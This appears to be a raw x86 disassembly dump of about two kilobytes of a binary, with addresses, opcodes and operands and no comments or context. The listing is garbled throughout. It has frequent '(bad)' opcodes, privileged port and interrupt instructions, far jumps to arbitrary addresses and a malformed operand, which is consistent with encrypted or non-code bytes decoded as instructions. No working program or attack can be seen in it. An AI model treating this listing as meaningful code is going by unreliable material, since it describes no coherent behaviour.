  40e5c2:	jmp    0x4998dc93
  40e5c7:	sbb    ebx,DWORD PTR [ebx]
  40e5c9:	in     eax,0x4d
  40e5cb:	test   al,0x69
  40e5cd:	shl    edx,0xb1
  40e5d0:	pop    esp
  40e5d1:	aam    0x2c
  40e5d3:	mov    dl,0x53
  40e5d5:	cld    
  40e5d6:	adc    DWORD PTR [esi+0x34],0x11
  40e5da:	xor    ebx,DWORD PTR [ecx]
  40e5dc:	shl    cl,1
  40e5de:	call   0x2170c0a1
  40e5e3:	mov    cl,BYTE PTR [edx+eiz*1-0x3]
  40e5e7:	cmp    eax,esp
  40e5e9:	or     eax,0xa09f5096
  40e5ee:	sbb    al,0x1b
  40e5f0:	jno    0x40e5a2
  40e5f2:	sub    al,0xb3
  40e5f4:	sti    
  40e5f5:	in     al,dx
  40e5f6:	add    cl,cl
  40e5f8:	dec    edi
  40e5f9:	sub    ah,BYTE PTR [ecx-0x59aa3b6c]
  40e5ff:	or     edx,edx
  40e601:	sbb    eax,0x6b109cf3
  40e606:	mov    ?,WORD PTR [edx+0x1c]
  40e609:	mov    DWORD PTR [eax],esp
  40e60b:	icebp  
  40e60c:	int    0xb9
  40e60e:	xlat   BYTE PTR ds:[ebx]
  40e60f:	xor    edx,DWORD PTR [ebx-0x1f]
  40e612:	das    
  40e613:	mov    eax,0xbba21432
  40e618:	sbb    BYTE PTR [ebx-0x7d],ch
  40e61b:	or     ebp,edx
  40e61d:	(bad)  
  40e61f:	inc    eax
  40e620:	ja     0x40e5d2
  40e622:	jns    0x40e5b5
  40e624:	je     0x40e68a
  40e626:	mov    ecx,0x1b9816d5
  40e62b:	sbb    esp,DWORD PTR ds:0x2bc98e76
  40e631:	stos   BYTE PTR es:[edi],al
  40e632:	mov    cl,al
  40e634:	xor    eax,0x4bd86635
  40e639:	jb     0x40e5c8
  40e63b:	(bad)  ds:0x5a19ed3e
  40e641:	popf   
  40e642:	mov    ch,0x3f
  40e644:	iret   
  40e645:	stos   BYTE PTR es:[edi],al
  40e646:	ret    0x5499
  40e649:	in     eax,0x54
  40e64b:	jmp    0x99e:0xba010af6
  40e652:	(bad)  
  40e653:	(bad)  
  40e655:	aam    0xe6
  40e657:	aad    0x47
  40e659:	mov    eax,ds:0x30d49fdd
  40e65e:	sub    edx,DWORD PTR [eax-0x5a]
  40e661:	jmp    0x285a2044
  40e666:	xor    esi,DWORD PTR [edi+0x67]
  40e669:	imul   edx,DWORD PTR [esi],0x8d041bbd
  40e66f:	xchg   edx,eax
  40e670:	(bad)  
  40e671:	mov    ds:0xeaba3f2e,al
  40e676:	or     al,0x83
  40e678:	cdq    
  40e679:	xchg   ebp,eax
  40e67a:	push   esp
  40e67b:	int    0xb5
  40e67d:	push   0xffffffa9
  40e67f:	leave  
  40e680:	lock xchg dl,bh
  40e683:	scas   al,BYTE PTR es:[edi]
  40e684:	arpl   dx,di
  40e686:	pushw  0xffd9
  40e689:	and    eax,DWORD PTR [ecx+0x56a40573]
  40e68f:	sbb    BYTE PTR [edx-0x3f845cb9],bl
  40e695:	inc    edx
  40e696:	or     ah,BYTE PTR [bx-0x22]
  40e69a:	popa   
  40e69b:	sahf   
  40e69c:	push   ebx
  40e69d:	shl    DWORD PTR [esp+ecx*1],cl
  40e6a0:	popf   
  40e6a1:	in     al,0xb7
  40e6a3:	sbb    ecx,ebp
  40e6a5:	and    BYTE PTR [eax],bh
  40e6a7:	out    dx,al
  40e6a8:	enter  0x36c1,0x2c
  40e6ac:	push   ebx
  40e6ad:	fsubr  QWORD PTR [esi-0x50]
  40e6b0:	sahf   
  40e6b1:	fdivrp st(2),st
  40e6b3:	pusha  
  40e6b4:	(bad)  
  40e6b5:	push   0xffffff9b
  40e6b7:	std    
  40e6b8:	cmp    al,0x43
  40e6ba:	cmp    al,0x15
  40e6bc:	das    
  40e6bd:	xor    eax,0xd1238e66
  40e6c2:	sbb    al,0x45
  40e6c4:	push   eax
  40e6c5:	push   ebp
  40e6c6:	xor    ebp,DWORD PTR [ebx+0x7ea5c3e4]
  40e6cc:	cs fwait
  40e6ce:	mov    ebp,0xf973b917
  40e6d3:	dec    ecx
  40e6d4:	dec    ecx
  40e6d5:	adc    cl,BYTE PTR ds:0x9e9a53df
  40e6db:	fdiv   QWORD PTR [ebp+0x208ccb7d]
  40e6e1:	out    dx,eax
  40e6e2:	in     eax,dx
  40e6e3:	test   esp,ebp
  40e6e5:	push   0x72
  40e6e7:	mov    bl,BYTE PTR [ebx]
  40e6e9:	sbb    DWORD PTR [ecx-0x1f],ecx
  40e6ec:	rcr    BYTE PTR [esi-0x620f048f],0x1
  40e6f3:	inc    eax
  40e6f4:	mov    bl,0xe7
  40e6f6:	retf   0x3671
  40e6f9:	push   0x76
  40e6fb:	mov    es,ecx
  40e6fd:	(bad)  
  40e700:	mov    ds:0xa0f96640,al
  40e705:	loopne 0x40e6bd
  40e707:	push   0x3d
  40e709:	push   cs
  40e70a:	inc    ecx
  40e70b:	sbb    BYTE PTR [esi+0x57f5b88],cl
  40e711:	jb     0x40e71d
  40e713:	cmp    al,dl
  40e715:	pusha  
  40e716:	jns    0x40e732
  40e718:	push   ecx
  40e719:	jmp    0x380ab7ea
  40e71e:	xchg   edx,eax
  40e71f:	sbb    DWORD PTR [edx-0x14b80544],ecx
  40e725:	jmp    0x40e75d
  40e727:	test   BYTE PTR [ebx-0x6e],dl
  40e72a:	pop    DWORD PTR [edx]
  40e72c:	jns    0x40e741
  40e72e:	jo     0x40e774
  40e730:	sub    ebp,DWORD PTR [ebx+0x6a]
  40e733:	test   al,0xc
  40e735:	and    dh,0x6d
  40e738:	in     eax,dx
  40e739:	dec    ecx
  40e73a:	out    dx,al
  40e73b:	into   
  40e73c:	lds    edx,FWORD PTR [ebx+0x66]
  40e73f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e740:	xchg   ebp,eax
  40e741:	aad    0xa9
  40e743:	dec    edx
  40e744:	leave  
  40e745:	inc    esp
  40e746:	mov    bh,0xbd
  40e748:	fnstsw WORD PTR [eax+0xacf19bd]
  40e74e:	or     DWORD PTR [esi+0x4d0ab5b7],esi
  40e754:	push   eax
  40e755:	icebp  
  40e756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e757:	dec    ecx
  40e758:	arpl   WORD PTR [esi-0x331ddcf0],bx
  40e75e:	mov    esp,0x7b55219
  40e763:	pushf  
  40e764:	test   al,0x2a
  40e766:	xchg   ebp,eax
  40e767:	std    
  40e768:	push   ebx
  40e769:	cmp    BYTE PTR [esi+0x1606d6c7],al
  40e76f:	xchg   ebp,edi
  40e771:	sbb    BYTE PTR [ecx],ch
  40e773:	cld    
  40e774:	and    bl,BYTE PTR [esi+0x4f7a8646]
  40e77a:	mov    ecx,0x737841d8
  40e77f:	adc    esp,esp
  40e781:	fwait
  40e782:	ror    WORD PTR [edi],0x62
  40e786:	add    ch,BYTE PTR [edx]
  40e788:	mov    BYTE PTR [ecx+0x1a],ch
  40e78b:	push   es
  40e78c:	pop    ss
  40e78d:	dec    ebp
  40e78e:	sbb    BYTE PTR [ebx-0x4f86416a],ch
  40e794:	sub    DWORD PTR [ecx-0x2f9a9e1e],eax
  40e79a:	add    bl,BYTE PTR [ebx]
  40e79c:	xchg   BYTE PTR [ebx-0x4a],ah
  40e79f:	aaa    
  40e7a0:	stos   BYTE PTR es:[edi],al
  40e7a1:	shr    DWORD PTR [edx+0x54548a9d],1
  40e7a7:	sbb    BYTE PTR [ecx-0x7a],ch
  40e7aa:	scas   al,BYTE PTR es:[edi]
  40e7ab:	inc    eax
  40e7ac:	popf   
  40e7ad:	inc    edx
  40e7ae:	sub    ebx,DWORD PTR [ecx]
  40e7b0:	inc    esi
  40e7b1:	loopne 0x40e7c0
  40e7b3:	sbb    BYTE PTR [edi+ebx*2],ah
  40e7b6:	add    DWORD PTR [edx-0x2fa3e1ad],esi
  40e7bc:	jb     0x40e83d
  40e7be:	mov    eax,ds:0x3079a724
  40e7c3:	or     dh,BYTE PTR [ecx-0x3e]
  40e7c6:	in     al,dx
  40e7c7:	fimul  WORD PTR [edx+0x6419d7b3]
  40e7cd:	jp     0x40e782
  40e7cf:	shl    DWORD PTR [edi-0xd65edca],1
  40e7d5:	imul   ebp,DWORD PTR [ebp-0x5c241b9],0xffffffdb
  40e7dc:	idiv   DWORD PTR [edx-0x72]
  40e7df:	outs   dx,BYTE PTR ds:[esi]
  40e7e0:	gs sbb eax,0x514cb749
  40e7e6:	cwde   
  40e7e7:	push   edx
  40e7e8:	adc    ebp,DWORD PTR [edi]
  40e7ea:	mov    ah,0xcf
  40e7ec:	imul   ebp,DWORD PTR [ecx+0x70],0x4fd8395d
  40e7f3:	ins    DWORD PTR es:[edi],dx
  40e7f4:	rol    dh,0x66
  40e7f7:	pop    esi
  40e7f8:	mov    ebx,0xad062cbf
  40e7fd:	dec    ebp
  40e7fe:	int    0x19
  40e800:	fdivr  st(6),st
  40e802:	in     al,0xc7
  40e804:	and    eax,0x531fe9ab
  40e809:	sbb    esi,edi
  40e80b:	loopne 0x40e7aa
  40e80d:	jge    0x40e868
  40e80f:	mov    ecx,0xf2086983
  40e814:	shr    BYTE PTR [eax+eax*2],cl
  40e817:	pop    ds
  40e818:	inc    ebx
  40e819:	adc    BYTE PTR [esi+0x1f],ah
  40e81c:	sub    eax,0xb8d08b35
  40e821:	push   ss
  40e822:	xor    ebp,0xffffff87
  40e825:	ja     0x40e85d
  40e827:	sbb    DWORD PTR [esi-0x7ec0e200],esi
  40e82d:	adc    BYTE PTR [esi+0x5f],ah
  40e830:	pop    eax
  40e831:	push   edi
  40e832:	cmp    dh,BYTE PTR [edi+0x19]
  40e835:	leave  
  40e836:	call   FWORD PTR [ecx]
  40e838:	add    eax,0xbcbec11c
  40e83d:	rcl    DWORD PTR [esi+ecx*4+0x1b01587],1
  40e844:	mov    cl,dl
  40e846:	ss sbb ebp,ecx
  40e849:	jg     0x40e89b
  40e84b:	(bad)  [eax+0x47c15119]
  40e851:	inc    ecx
  40e852:	cs push es
  40e854:	sar    DWORD PTR ds:0x2f8cd472,cl
  40e85a:	sbb    edi,DWORD PTR [edi+0xf3dfd53]
  40e860:	inc    ecx
  40e861:	pop    ebx
  40e862:	test   dh,dh
  40e864:	mov    ebx,0x7e19e2ba
  40e869:	lods   al,BYTE PTR ds:[esi]
  40e86a:	mov    ecx,0x959299f2
  40e86f:	push   esi
  40e870:	push   ebx
  40e871:	call   0x5c12139a
  40e876:	jns    0x40e8c8
  40e878:	push   edx
  40e879:	dec    esi
  40e87a:	jle    0x40e856
  40e87c:	fsubp  st(2),st
  40e87e:	fwait
  40e87f:	push   DWORD PTR [eax+0x22]
  40e882:	hlt    
  40e883:	js     0x40e8d8
  40e885:	xchg   edx,eax
  40e886:	lods   al,BYTE PTR ds:[esi]
  40e887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e888:	inc    dh
  40e88a:	scas   al,BYTE PTR es:[edi]
  40e88b:	dec    esp
  40e88c:	adc    BYTE PTR [eax+0x399fc1d0],dl
  40e892:	pop    edi
  40e893:	enter  0xbda3,0x63
  40e897:	daa    
  40e898:	push   ebx
  40e899:	ss mov ebx,0x91eb6df5
  40e89f:	and    ebx,eax
  40e8a1:	imul   edi,DWORD PTR [edi+0x2d],0x3c
  40e8a5:	out    dx,eax
  40e8a6:	ins    BYTE PTR es:[edi],dx
  40e8a7:	pop    eax
  40e8a8:	cld    
  40e8a9:	mov    ebp,0x4a2d3151
  40e8ae:	jns    0x40e923
  40e8b0:	jl     0x40e88d
  40e8b2:	sub    eax,0x3c91d582
  40e8b7:	sbb    DWORD PTR [ecx],esi
  40e8b9:	pop    ebx
  40e8ba:	pop    edx
  40e8bb:	adc    al,0x48
  40e8bd:	sti    
  40e8be:	retf   
  40e8bf:	fisub  WORD PTR [ebp+0x2f]
  40e8c2:	dec    edx
  40e8c3:	popf   
  40e8c4:	fs ins DWORD PTR es:[edi],dx
  40e8c6:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40e8c8:	stos   DWORD PTR es:[edi],eax
  40e8c9:	xchg   edi,eax
  40e8ca:	and    esp,DWORD PTR [edx+0x44466a42]
  40e8d0:	retf   0x3689
  40e8d3:	jge    0x40e90c
  40e8d5:	or     BYTE PTR [esi+0x1f],ah
  40e8d8:	push   edx
  40e8d9:	popf   
  40e8da:	out    0x39,eax
  40e8dc:	xchg   ecx,eax
  40e8dd:	or     BYTE PTR [esi-0x44],dl
  40e8e0:	lods   al,BYTE PTR ds:[esi]
  40e8e1:	inc    esp
  40e8e2:	hlt    
  40e8e3:	pop    ecx
  40e8e4:	sub    BYTE PTR [esi+ebx*4],bh
  40e8e7:	pop    ebp
  40e8e8:	lds    eax,FWORD PTR [ecx+0x14513266]
  40e8ee:	xor    ah,cl
  40e8f0:	jae    0x40e8a6
  40e8f2:	adc    al,0xaa
  40e8f4:	ins    DWORD PTR es:[edi],dx
  40e8f5:	pop    es
  40e8f6:	test   al,0xb5
  40e8f8:	rep outs dx,BYTE PTR ds:[esi]
  40e8fa:	(bad)  
  40e8fb:	aaa    
  40e8fc:	pop    esp
  40e8fd:	cmp    BYTE PTR [esi-0x6a],ah
  40e900:	and    DWORD PTR es:[ecx+ebx*2+0x4b],esp
  40e905:	(bad)  [ebp+0x18]
  40e908:	jmp    0x110ff328
  40e90d:	pop    edi
  40e90e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e90f:	imul   edx,DWORD PTR [eax-0x77],0xd488ce9d
  40e916:	xor    DWORD PTR [esi+eax*1],esi
  40e919:	mov    esp,0xc43b82b1
  40e91e:	jne    0x40e93b
  40e920:	imul   ebp,DWORD PTR ds:0x5b66947,0x95c89c9c
  40e92a:	dec    eax
  40e92b:	aaa    
  40e92c:	pop    edi
  40e92d:	adc    BYTE PTR [ecx+edi*2-0x4b950d70],0x70
  40e935:	jg     0x40e98c
  40e937:	jnp    0x40e8e6
  40e939:	imul   ebp,DWORD PTR [esi],0xa4c9370b
  40e93f:	fsub   DWORD PTR [edi+ebx*2-0x79]
  40e943:	push   esp
  40e944:	sar    DWORD PTR [ecx-0x6ec422ac],cl
  40e94a:	sbb    bl,BYTE PTR [ebx]
  40e94c:	inc    esi
  40e94d:	retf   0x6fd9
  40e950:	adc    cl,BYTE PTR [eax-0x20acc748]
  40e956:	sahf   
  40e957:	repz je 0x40e9c5
  40e95a:	xchg   BYTE PTR [edi+0x8ba6bc1],ch
  40e960:	cmp    BYTE PTR [eax],bl
  40e962:	inc    ecx
  40e963:	inc    edx
  40e964:	cmp    eax,DWORD PTR [ecx-0x72]
  40e967:	and    bl,BYTE PTR ds:0xb37a797e
  40e96d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e96e:	lahf   
  40e96f:	jge    0x40e94a
  40e971:	sbb    al,BYTE PTR [edx+0x18]
  40e974:	inc    ecx
  40e975:	outs   dx,BYTE PTR ds:[esi]
  40e976:	or     dl,bl
  40e978:	(bad)  
  40e979:	mov    ebp,0xf065b3bb
  40e97e:	int    0x93
  40e980:	sbb    al,0xc0
  40e982:	mov    ax,ds:0x88b38884
  40e988:	cmp    ch,BYTE PTR [ebx-0x9]
  40e98b:	push   edx
  40e98c:	mov    edi,0xe692a1bd
  40e991:	or     bh,ah
  40e993:	adc    BYTE PTR [ebx+0x32],0xf7
  40e997:	dec    eax
  40e998:	test   dl,cl
  40e99a:	sbb    eax,0xee6afaa0
  40e99f:	add    ah,BYTE PTR ds:0x548181f3
  40e9a5:	jno    0x40e9b2
  40e9a7:	out    0x63,al
  40e9a9:	jbe    0x40e964
  40e9ab:	sbb    DWORD PTR [ebp+0x28],0xffffffb6
  40e9af:	les    esi,FWORD PTR [esi-0x7]
  40e9b2:	jmp    0x3116:0x5bef93d4
  40e9b9:	ins    DWORD PTR es:[edi],dx
  40e9ba:	out    0xd1,al
  40e9bc:	lahf   
  40e9bd:	leave  
  40e9be:	dec    di
  40e9c0:	cld    
  40e9c1:	or     ebx,eax
  40e9c3:	sub    al,0x7
  40e9c5:	call   0xb5a40301
  40e9ca:	push   ds
  40e9cb:	adc    dl,BYTE PTR [eax+0x25]
  40e9ce:	loope  0x40e98e
  40e9d0:	push   ebx
  40e9d1:	outs   dx,BYTE PTR ds:[esi]
  40e9d2:	mov    esi,0xf9bf58ea
  40e9d7:	push   0xffffff8f
  40e9d9:	push   ecx
  40e9da:	(bad)  
  40e9db:	sbb    DWORD PTR [esi-0x62],esi
  40e9de:	stos   BYTE PTR es:[edi],al
  40e9df:	jno    0x40ea2a
  40e9e1:	pop    eax
  40e9e2:	mov    eax,0x618a5316
  40e9e7:	dec    eax
  40e9e8:	out    dx,al
  40e9e9:	cmp    DWORD PTR [eax-0x3b90e122],esp
  40e9ef:	stos   DWORD PTR es:[edi],eax
  40e9f0:	int3   
  40e9f1:	push   esp
  40e9f2:	(bad)  
  40e9f3:	in     eax,0x13
  40e9f5:	les    ebp,FWORD PTR [ecx-0x7]
  40e9f8:	sbb    ah,BYTE PTR [ebp+0x822cd70]
  40e9fe:	sub    ebx,DWORD PTR [edx+esi*8-0x73]
  40ea02:	test   al,0xec
  40ea04:	nop
  40ea05:	outs   dx,DWORD PTR ds:[esi]
  40ea06:	(bad)  
  40ea07:	loope  0x40ea71
  40ea09:	mov    dh,0xd5
  40ea0b:	shl    DWORD PTR [ecx-0x5a],0xf9
  40ea0f:	aaa    
  40ea10:	mov    WORD PTR [edi-0x7b4274ae],cs
  40ea16:	into   
  40ea17:	adc    DWORD PTR [ecx+0x4bcd6690],ebx
  40ea1d:	repnz add eax,0xae1fba6d
  40ea23:	sbb    DWORD PTR ds:0xdda0eb3d,edi
  40ea29:	pop    ecx
  40ea2a:	jp     0x40ea10
  40ea2c:	push   ebx
  40ea2d:	push   0x60281220
  40ea32:	ret    0xe5ac
  40ea35:	push   0x74
  40ea37:	cmp    BYTE PTR [ebx],cl
  40ea39:	xchg   ecx,eax
  40ea3a:	sbb    al,0x8
  40ea3c:	ret    
  40ea3d:	xor    eax,0xff537eea
  40ea42:	sahf   
  40ea43:	mov    dh,0x97
  40ea45:	mov    dh,0xf3
  40ea47:	push   ds
  40ea48:	hlt    
  40ea49:	push   0x2b
  40ea4b:	mov    edi,0x310b1629
  40ea50:	dec    ebx
  40ea51:	pusha  
  40ea52:	(bad)  
  40ea54:	mov    DWORD PTR [edx-0x1c],ecx
  40ea57:	adc    dl,bl
  40ea59:	push   DWORD PTR [edx+eiz*8+0x87669aa]
  40ea60:	cmc    
  40ea61:	sub    bl,BYTE PTR [edx+0x59]
  40ea64:	and    eax,0x436bd4c7
  40ea69:	stos   BYTE PTR es:[edi],al
  40ea6a:	jns    0x40ea9f
  40ea6c:	imul   ebp,DWORD PTR [ecx+esi*4-0x7fee31a8],0x69f50a19
  40ea77:	lahf   
  40ea78:	mov    esi,0x2fa6e20c
  40ea7d:	stc    
  40ea7e:	mov    gs,WORD PTR [esi]
  40ea80:	jnp    0x40eab9
  40ea82:	push   edi
  40ea83:	inc    edx
  40ea84:	push   edx
  40ea85:	xchg   edi,eax
  40ea86:	adc    ah,al
  40ea88:	not    esp
  40ea8a:	mov    ch,0xac
  40ea8c:	daa    
  40ea8d:	jmp    0x2700048e
  40ea92:	inc    edi
  40ea93:	(bad)  
  40ea94:	std    
  40ea95:	clc    
  40ea96:	stc    
  40ea97:	fld    DWORD PTR [ebp-0x45]
  40ea9a:	jns    0x40ead4
  40ea9c:	mov    cs,WORD PTR [esi-0x6844e4db]
  40eaa2:	push   ss
  40eaa3:	fstp   DWORD PTR [eax+0x6a]
  40eaa6:	or     al,0x20
  40eaa8:	pop    esp
  40eaa9:	icebp  
  40eaaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaab:	xchg   BYTE PTR [ebx-0x52f986b7],ah
  40eab1:	adc    ch,BYTE PTR [ecx-0x7c2c1a75]
  40eab7:	sbb    esp,ecx
  40eab9:	or     bl,BYTE PTR [esi+0x6a]
  40eabc:	push   esp
  40eabd:	icebp  
  40eabe:	pop    ss
  40eabf:	jecxz  0x40eb14
  40eac1:	inc    ebx
  40eac2:	daa    
  40eac3:	ja     0x40ea87
  40eac5:	call   0x6b3c96f8
  40eaca:	das    
  40eacb:	push   ebp
  40eacc:	jg     0x40eac4
  40eace:	cmp    BYTE PTR [ebp+esi*1+0x38196690],ah
  40ead5:	mov    bh,0xb0
  40ead7:	js     0x40eb29
  40ead9:	out    dx,eax
  40eada:	mov    eax,DWORD PTR [ecx+0x55cd69ae]
  40eae0:	daa    
  40eae1:	adc    al,0xb0
  40eae3:	gs xchg edi,eax
  40eae5:	cmc    
  40eae6:	xchg   sp,ax
  40eae8:	stc    
  40eae9:	sbb    eax,0xb61c0b9e
  40eaee:	arpl   WORD PTR [edx+0x3dda3f74],bp
  40eaf4:	adc    ebx,DWORD PTR [ecx+ebx*1]
  40eaf7:	js     0x40eb2a
  40eaf9:	push   esp
  40eafa:	dec    eax
  40eafb:	mov    DWORD PTR [ecx+0x36],edx
  40eafe:	pop    ds
  40eaff:	sti    
  40eb00:	out    dx,al
  40eb01:	imul   ebx,DWORD PTR ss:[ecx+0x53731f60],0xffffffe8
  40eb09:	test   DWORD PTR [ecx],edx
  40eb0b:	and    dl,cl
  40eb0d:	sub    al,BYTE PTR [edi+0x790812f5]
  40eb13:	in     eax,0x3
  40eb15:	inc    esp
  40eb16:	fwait
  40eb17:	dec    eax
  40eb18:	loopne 0x40eac2
  40eb1a:	mov    ecx,0xf9b97fd8
  40eb1f:	adc    DWORD PTR [esi-0xf6a7dcb],0x2d
  40eb26:	cwd    
  40eb28:	jmp    0x3948409f
  40eb2d:	es jb  0x40eb4b
  40eb30:	addr16 mov bl,0xe9
  40eb33:	dec    esp
  40eb34:	(bad)  
  40eb35:	dec    ebp
  40eb36:	dec    edx
  40eb38:	push   ebx
  40eb39:	pop    edi
  40eb3a:	inc    esp
  40eb3b:	fwait
  40eb3c:	int    0x1d
  40eb3e:	test   eax,0xa46abd4a
  40eb43:	fnstcw WORD PTR [eax]
  40eb45:	mov    ds:0x2fb4a76c,al
  40eb4a:	data16 mov al,ds:0xe705afd9
  40eb50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb51:	pusha  
  40eb52:	mov    ds:0x2a22a819,eax
  40eb57:	mov    ds:0x4e37362a,al
  40eb5c:	push   ebx
  40eb5d:	call   0xd565551d
  40eb62:	icebp  
  40eb63:	call   0x132f183d
  40eb68:	ror    ebp,cl
  40eb6a:	mov    al,ds:0x97a49609
  40eb6f:	add    BYTE PTR [ebx-0x19],dl
  40eb72:	or     BYTE PTR [esi-0xb],dh
  40eb75:	fnstcw WORD PTR [ebx-0x269664fc]
  40eb7b:	xor    DWORD PTR [ebx],0xffffffcf
  40eb7e:	pop    edx
  40eb7f:	mov    ds,WORD PTR [eax+0xf]
  40eb82:	das    
  40eb83:	inc    edx
  40eb84:	shr    edx,cl
  40eb86:	cmp    al,BYTE PTR [ebp+0x7ab043f8]
  40eb8c:	inc    ebx
  40eb8d:	imul   esp,DWORD PTR [edx+ebp*2],0x60
  40eb91:	or     eax,0xa184fb83
  40eb96:	repz call 0x53bc:0xca18553
  40eb9e:	xor    eax,0xbc6baa46
  40eba3:	rcl    BYTE PTR [eax-0x53],1
  40eba6:	rol    BYTE PTR [ecx+0x30],cl
  40eba9:	rol    DWORD PTR [esi-0x77],1
  40ebac:	pop    ss
  40ebad:	fs jns 0x40ebac
  40ebb0:	in     al,0x31
  40ebb2:	cmp    al,dl
  40ebb4:	dec    edi
  40ebb5:	or     ch,BYTE PTR [ecx-0xf8df260]
  40ebbb:	sbb    DWORD PTR [eax+ecx*2+0x34baabd3],ebp
  40ebc2:	push   esi
  40ebc3:	mov    esi,0x4d15e550
  40ebc8:	out    dx,al
  40ebc9:	sbb    eax,DWORD PTR [ebx+esi*2]
  40ebcc:	jae    0x40ec07
  40ebce:	mov    ebx,0x27441119
  40ebd3:	cmp    eax,DWORD PTR [eax]
  40ebd5:	ficom  DWORD PTR [eax-0x470378ee]
  40ebdb:	cdq    
  40ebdc:	pop    ebx
  40ebdd:	out    dx,eax
  40ebde:	pop    esp
  40ebdf:	sti    
  40ebe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebe1:	into   
  40ebe2:	(bad)  
  40ebe3:	sbb    DWORD PTR [edi],ebp
  40ebe5:	call   0xd253f3d1
  40ebea:	push   ecx
  40ebeb:	mov    WORD PTR [ebx+0x5f],ss
  40ebee:	inc    esi
  40ebef:	jnp    0x40ebaa
  40ebf1:	ins    DWORD PTR es:[edi],dx
  40ebf2:	push   0xbf4dab1a
  40ebf7:	fist   DWORD PTR [ecx-0x52]
  40ebfa:	jo     0x40ebd3
  40ebfc:	popf   
  40ebfd:	or     ebp,DWORD PTR [esi]
  40ebff:	sbb    DWORD PTR [esi],esp
  40ec01:	push   edx
  40ec02:	jg     0x40ec65
  40ec04:	mov    BYTE PTR [edx],ch
  40ec06:	mov    ebp,DWORD PTR [ebx-0x4606a348]
  40ec0c:	sbb    eax,0x5175d763
  40ec11:	imul   ecx,DWORD PTR [ebx],0xe1d8b8f
  40ec17:	int3   
  40ec18:	ror    dh,cl
  40ec1a:	inc    ax
  40ec1c:	stos   BYTE PTR es:[edi],al
  40ec1d:	mov    ebp,eax
  40ec1f:	sbb    ch,0x6f
  40ec22:	xlat   BYTE PTR ds:[ebx]
  40ec23:	sbb    DWORD PTR [esi-0x57b2f9a2],esi
  40ec29:	mov    ch,0x3d
  40ec2b:	pop    ss
  40ec2c:	enter  0x71fc,0x92
  40ec30:	adc    ebx,DWORD PTR [eax+0x55]
  40ec33:	retf   
  40ec34:	jae    0x40ec7b
  40ec36:	cmovle esi,ecx
  40ec39:	add    eax,0x6306300
  40ec3e:	cli    
  40ec3f:	jae    0x40ec84
  40ec41:	and    BYTE PTR [ecx+ebp*1],bl
  40ec44:	push   ebx
  40ec45:	adc    al,BYTE PTR [ebp-0x3468f0e5]
  40ec4b:	xchg   esi,eax
  40ec4c:	add    al,0x6b
  40ec4e:	inc    ebp
  40ec4f:	and    al,0x2d
  40ec51:	sub    eax,0xc2feab94
  40ec56:	sbb    edi,edi
  40ec58:	mov    ds:0xec386732,al
  40ec5d:	ds call 0xc21b:0x69a083aa
  40ec65:	data16 or dh,BYTE PTR [ecx+0x8]
  40ec69:	outs   dx,DWORD PTR ds:[esi]
  40ec6a:	xchg   ebp,eax
  40ec6b:	pop    ebx
  40ec6c:	sub    eax,0x6a6566db
  40ec71:	xchg   edi,eax
  40ec72:	pop    ebx
  40ec73:	cmp    eax,0xd634cc31
  40ec78:	imul   ebp,DWORD PTR [ebx],0x38232f1
  40ec7e:	aam    0x5
  40ec80:	ret    
  40ec81:	cmp    esp,DWORD PTR [esi+0x5c]
  40ec84:	push   ds
  40ec85:	test   edx,0x7796418d
  40ec8b:	sbb    ecx,DWORD PTR [edi-0x4b]
  40ec8e:	popa   
  40ec8f:	mov    edi,0x6db1ab29
  40ec94:	push   ebx
  40ec95:	dec    ebp
  40ec96:	pop    esi
  40ec97:	pop    ebp
  40ec98:	inc    ebx
  40ec99:	pop    ebx
  40ec9a:	or     BYTE PTR [edi+0x1f3a699e],ch
  40eca0:	nop
  40eca1:	mov    ah,0x56
  40eca3:	mov    ebp,0xceea28f3
  40eca8:	das    
  40eca9:	ret    0x50a
  40ecac:	push   es
  40ecad:	pushf  
  40ecae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecaf:	xchg   ebx,eax
  40ecb0:	out    dx,al
  40ecb1:	or     ch,BYTE PTR [edx-0x1e965cd4]
  40ecb7:	dec    esi
  40ecb8:	ins    DWORD PTR es:[edi],dx
  40ecb9:	mov    dh,0xef
  40ecbb:	xlat   BYTE PTR ds:[ebx]
  40ecbc:	mov    dh,0x36
  40ecbe:	dec    eax
  40ecbf:	sbb    edx,ecx
  40ecc1:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40ecc3:	fxch   st(6)
  40ecc5:	fcom   QWORD PTR [ebp-0x416956c4]
  40eccb:	sbb    DWORD PTR [edx-0x7f],ebp
  40ecce:	in     al,dx
  40eccf:	mov    dh,BYTE PTR [esi-0x2f]
  40ecd2:	xchg   esp,eax
  40ecd3:	xlat   BYTE PTR ds:[ebx]
  40ecd4:	push   ebx
  40ecd5:	test   DWORD PTR [ebx],0x7d2acce4
  40ecdb:	mov    ds:0x11dc6b03,eax
  40ece0:	and    bh,BYTE PTR [ebx-0x9edac7b]
  40ece6:	les    ebp,FWORD PTR [bp-0x4e]
  40ecea:	(bad)  
  40eceb:	hlt    
  40ecec:	xchg   edx,eax
  40eced:	dec    esp
  40ecee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecef:	clc    
  40ecf0:	out    0x2c,eax
  40ecf2:	sahf   
  40ecf3:	mov    al,ds:0xcd87fb53
  40ecf8:	xor    DWORD PTR [edx],ecx
  40ecfa:	fimul  DWORD PTR [edi]
  40ecfc:	push   ebx
  40ecfd:	js     0x40ece5
  40ecff:	imul   BYTE PTR [ecx]
  40ed01:	mov    al,0x70
  40ed03:	(bad)  
  40ed04:	fild   DWORD PTR [ebx]
  40ed06:	mov    bl,0x28
  40ed08:	jp     0x40ecdc
  40ed0a:	data16 xor al,0x60
  40ed0d:	sbb    bl,BYTE PTR [ebp-0x35]
  40ed10:	push   ebx
  40ed11:	pusha  
  40ed12:	data16 aad 0x5b
  40ed15:	popf   
  40ed16:	sub    al,0x52
  40ed18:	mov    edx,0xfed08414
  40ed1d:	pop    ds
  40ed1e:	lods   al,BYTE PTR ds:[esi]
  40ed1f:	pop    es
